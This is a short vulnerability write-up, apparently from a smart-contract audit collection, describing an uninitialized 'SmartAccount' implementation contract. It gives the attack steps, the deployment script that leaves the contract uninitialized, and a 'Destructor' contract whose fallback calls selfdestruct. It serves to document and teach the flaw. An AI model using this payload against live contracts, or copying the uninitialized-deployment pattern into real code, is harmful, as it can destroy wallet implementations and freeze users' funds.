@@ -1,0 +1,25 @@
+Type of vulnerability: Uninitialized Implementation Contract
+
+Cause of vulnerability: The `SmartAccount` implementation contract can be deployed without being initialized, allowing it to be destroyed via a `selfdestruct` call.
+
+Execution process:
+1. Deploy the `SmartAccount` implementation contract without initializing it.
+2. Execute a transaction containing a single `delegatecall` to a contract that executes the `selfdestruct` opcode on any incoming call.
+3. The implementation contract is destroyed, freezing all functionality of wallets that point to this implementation.
+
+Vulnerable code:
+- Deployment script without initialization:
+  ```javascript
+  const SmartWallet = await ethers.getContractFactory("SmartAccount");
+  const baseImpl = await SmartWallet.deploy();
+  await baseImpl.deployed();
+  console.log("base wallet impl deployed at: ", baseImpl.address);
+  ```
+- Destructor contract:
+  ```solidity
+  contract Destructor {
+      fallback() external {
+          selfdestruct(payable(0));
+      }
+  }
+  ```
